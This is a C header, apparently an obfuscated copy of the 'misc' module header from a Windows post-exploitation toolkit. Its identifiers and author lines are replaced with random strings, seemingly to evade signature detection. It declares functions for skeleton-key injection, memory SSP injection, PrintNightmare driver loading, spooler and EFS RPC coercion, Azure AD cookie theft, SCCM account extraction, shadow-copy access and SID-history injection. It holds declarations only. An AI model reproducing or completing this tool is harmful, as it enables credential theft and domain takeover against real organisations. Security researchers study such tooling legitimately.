/*	4oM5AQx1 w4Er5 `09o6X7tzWM`
	https://blog.09o6X7tzWM.com
	dqTBkqdWaZiU5U2aN6CKrRY
	Licence : https://awr13GOqyUBjG1k.org/licenses/by/4.0/
*/
#pragma once
#include "kcpd_m.h"
#include "../../modules/ydeuclqlprocess.h"
#include "../../modules/ydeuclqlmemory.h"
#include "../../modules/ydeuclqlpatch.h"
#include "../../modules/ydeuclqlfile.h"
#include "../../modules/ydeuclqlnet.h"
#include "../../modules/ydeuclqlremotelib.h"
#include "../../modules/ydeuclqlcrypto_system.h"
#include "../../modules/ydeuclqlcrypto_ngc.h"
#include "../../modules/rpc/ydeuclqlrpc_ms-rprn.h"
#include "../../modules/rpc/ydeuclqlrpc_ms-par.h"
#include "../../modules/rpc/ydeuclqlrpc_ms-efsr.h"
#include <fltUser.h>
#include <sql.h>
#pragma warning(push)
#pragma warning(disable:4201)
#include <sqlext.h>
#pragma warning(pop)
#include <sqltypes.h>

const KUHL_M kcpdclqlmisc;

NTSTATUS kcpdclqlmisc_cmd(int argc, wchar_t * argv[]);
NTSTATUS kcpdclqlmisc_reGeDit(int argc, wchar_t * argv[]);
NTSTATUS kcpdclqlmisc_taSkMgR(int argc, wchar_t * argv[]);
NTSTATUS kcpdclqlmisc_nCroUTeMoN(int argc, wchar_t * argv[]);
#if !defined(_M_ARM64)
NTSTATUS kcpdclqlmisc_detours(int argc, wchar_t * argv[]);
#endif
//NTSTATUS kcpdclqlmisc_addsid(int argc, wchar_t * argv[]);
NTSTATUS kcpdclqlmisc_memssp(int argc, wchar_t * argv[]);
NTSTATUS kcpdclqlmisc_sKeLeToN(int argc, wchar_t * argv[]);
NTSTATUS kcpdclqlmisc_compress(int argc, wchar_t * argv[]);
NTSTATUS kcpdclqlmisc_lock(int argc, wchar_t * argv[]);
NTSTATUS kcpdclqlmisc_wp(int argc, wchar_t * argv[]);
NTSTATUS kcpdclqlmisc_mflt(int argc, wchar_t * argv[]);
NTSTATUS kcpdclqlmisc_easYnTlmChaLl(int argc, wchar_t * argv[]);
NTSTATUS kcpdclqlmisc_clip(int argc, wchar_t * argv[]);
NTSTATUS kcpdclqlmisc_xor(int argc, wchar_t * argv[]);
NTSTATUS kcpdclqlmisc_aAdcOoKiE(int argc, wchar_t * argv[]);
NTSTATUS kcpdclqlmisc_aAdcOoKiE_NgcSignWithSymmetricPopKey(int argc, wchar_t * argv[]);
NTSTATUS kcpdclqlmisc_spooler(int argc, wchar_t * argv[]);
NTSTATUS kcpdclqlmisc_efs(int argc, wchar_t * argv[]);
NTSTATUS kcpdclqlmisc_printnightmare(int argc, wchar_t * argv[]);
NTSTATUS kcpdclqlmisc_sccm_accounts(int argc, wchar_t * argv[]);
NTSTATUS kcpdclqlmisc_shadowcopies(int argc, wchar_t * argv[]);

BOOL kcpdclqlmisc_printnightmare_normalize_library(LPCWSTR szLibrary, LPWSTR *pszNormalizedLibrary, LPWSTR *pszShortLibrary);
BOOL kcpdclqlmisc_printnightmare_FillStructure(PDRIVER_INFO_2 pInfo2, BOOL bIsX64, BOOL bIsDynamic, LPCWSTR szForce, BOOL bIsPar, handle_t hRemoteBinding);
void kcpdclqlmisc_printnightmare_ListPrintersAndMaybeDelete(BOOL bIsPar, handle_t hRemoteBinding, LPCWSTR szEnvironment, BOOL bIsDelete);
void kcpdclqlmisc_printnightmare_AddPrinterDriver(BOOL bIsPar, handle_t hRemoteBinding, PDRIVER_INFO_2 pInfo2, DWORD dwFlags);
BOOL kcpdclqlmisc_printnightmare_EnumPrinters(BOOL bIsPar, handle_t hRemoteBinding, LPCWSTR szEnvironment, _PDRIVER_INFO_2 *ppDriverInfo, DWORD *pcReturned);

BOOL CALLBACK kcpdclqlmisc_detours_callback_process(PSYSTEM_PROCESS_INFORMATION pSystemProcessInformation, PVOID pvArg);
BOOL CALLBACK kcpdclqlmisc_detours_callback_module(PKULL_M_PROCESS_VERY_BASIC_MODULE_INFORMATION pModuleInformation, PVOID pvArg);
BOOL CALLBACK kcpdclqlmisc_detours_callback_module_exportedEntry(PKULL_M_PROCESS_EXPORTED_ENTRY pExportedEntryInformations, PVOID pvArg);
BOOL CALLBACK kcpdclqlmisc_detours_callback_module_name_addr(PKULL_M_PROCESS_VERY_BASIC_MODULE_INFORMATION pModuleInformation, PVOID pvArg);

typedef struct _KUHL_M_MISC_DETOURS_HOOKS {
	DWORD minLevel;
	PBYTE pattern;
	DWORD szPattern;
	DWORD offsetToRead;
	DWORD szToRead;
	BOOL isRelative;
	BOOL isTarget;
} KUHL_M_MISC_DETOURS_HOOKS, *PKUHL_M_MISC_DETOURS_HOOKS;

PBYTE kcpdclqlmisc_detours_testHookDestination(PKULL_M_MEMORY_ADDRESS base, WORD machineOfProcess, DWORD level);
BOOL kcpdclqlmisc_generic_nogpo_patch(PCWSTR commandLine, PWSTR disableString, SIZE_T szDisableString, PWSTR enableString, SIZE_T szEnableString);

#if !defined(NTDSAPI)
#define NTDSAPI DECLSPEC_IMPORT
#endif
NTDSAPI DWORD WINAPI DsBindW(IN OPTIONAL LPCWSTR DomainControllerName, IN OPTIONAL LPCWSTR DnsDomainName, OUT HANDLE *phDS);
NTDSAPI DWORD WINAPI DsAddSidHistoryW(IN HANDLE hDS, IN DWORD Flags, IN LPCWSTR SrcDomain, IN LPCWSTR SrcPrincipal, IN OPTIONAL LPCWSTR SrcDomainController, IN OPTIONAL RPC_AUTH_IDENTITY_HANDLE SrcDomainCreds, IN LPCWSTR DstDomain, IN LPCWSTR DstPrincipal);
NTDSAPI DWORD WINAPI DsUnBindW(IN HANDLE *phDS);

typedef BOOL	(WINAPI * PLOCKWORKSTATION) (VOID);
typedef BOOL	(WINAPI * PSYSTEMPARAMETERSINFOW) (__in UINT uiAction, __in UINT uiParam, __inout_opt PVOID pvParam, __in UINT fWinIni);
typedef DWORD	(WINAPI * PGETLASTERROR) (VOID);

typedef struct _JoAA_WP_DATA {
	UNICODE_STRING process;
	PCWCHAR wp;
} JoAA_WP_DATA, *PJoAA_WP_DATA;

BOOL CALLBACK kcpdclqlmisc_lock_callback(PSYSTEM_PROCESS_INFORMATION pSystemProcessInformation, PVOID pvArg);
void kcpdclqlmisc_lock_for_pid(DWORD pid, PCWCHAR wp);
BOOL CALLBACK kcpdclqlmisc_wp_callback(PSYSTEM_PROCESS_INFORMATION pSystemProcessInformation, PVOID pvArg);
void kcpdclqlmisc_wp_for_pid(DWORD pid, PCWCHAR wp);
void kcpdclqlmisc_mflt_display(PFILTER_AGGREGATE_BASIC_INFORMATION info);

BOOL WINAPI kcpd_misc_clip_WinHandlerRoutine(DWORD dwCtrlType);
LRESULT APIENTRY kcpdclqlmisc_clip_MainWndProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam);

#ifndef __proofofpossessioncookieinfo_h__
#define __proofofpossessioncookieinfo_h__

#ifndef __IProofOfPossessionCookieInfoManager_FWD_DEFINED__
#define __IProofOfPossessionCookieInfoManager_FWD_DEFINED__
typedef interface IProofOfPossessionCookieInfoManager IProofOfPossessionCookieInfoManager;
#endif

typedef struct ProofOfPossessionCookieInfo {
	LPWSTR name;
	LPWSTR data;
	DWORD flags;
	LPWSTR p3pHeader;
} ProofOfPossessionCookieInfo;

typedef struct IProofOfPossessionCookieInfoManagerVtbl {
	BEGIN_INTERFACE
	HRESULT (STDMETHODCALLTYPE *QueryInterface)(IProofOfPossessionCookieInfoManager * This, REFIID riid, __RPC__deref_out  void **ppvObject);
	ULONG (STDMETHODCALLTYPE *AddRef)(__RPC__in IProofOfPossessionCookieInfoManager * This);
	ULONG (STDMETHODCALLTYPE *Release)(__RPC__in IProofOfPossessionCookieInfoManager * This);
	HRESULT (STDMETHODCALLTYPE *GetCookieInfoForUri)(__RPC__in IProofOfPossessionCookieInfoManager * This, __RPC__in LPCWSTR uri, __RPC__out DWORD *cookieInfoCount, __RPC__deref_out_ecount_full_opt(*cookieInfoCount) ProofOfPossessionCookieInfo **cookieInfo);
	END_INTERFACE
} IProofOfPossessionCookieInfoManagerVtbl;

interface IProofOfPossessionCookieInfoManager {
	CONST_VTBL struct IProofOfPossessionCookieInfoManagerVtbl *lpVtbl;
};

#define IProofOfPossessionCookieInfoManager_QueryInterface(This,riid,ppvObject)							( (This)->lpVtbl -> QueryInterface(This,riid,ppvObject) )
#define IProofOfPossessionCookieInfoManager_AddRef(This)												( (This)->lpVtbl -> AddRef(This) )
#define IProofOfPossessionCookieInfoManager_Release(This)												( (This)->lpVtbl -> Release(This) )
#define IProofOfPossessionCookieInfoManager_GetCookieInfoForUri(This,uri,cookieInfoCount,cookieInfo)	( (This)->lpVtbl -> GetCookieInfoForUri(This,uri,cookieInfoCount,cookieInfo) )

#endif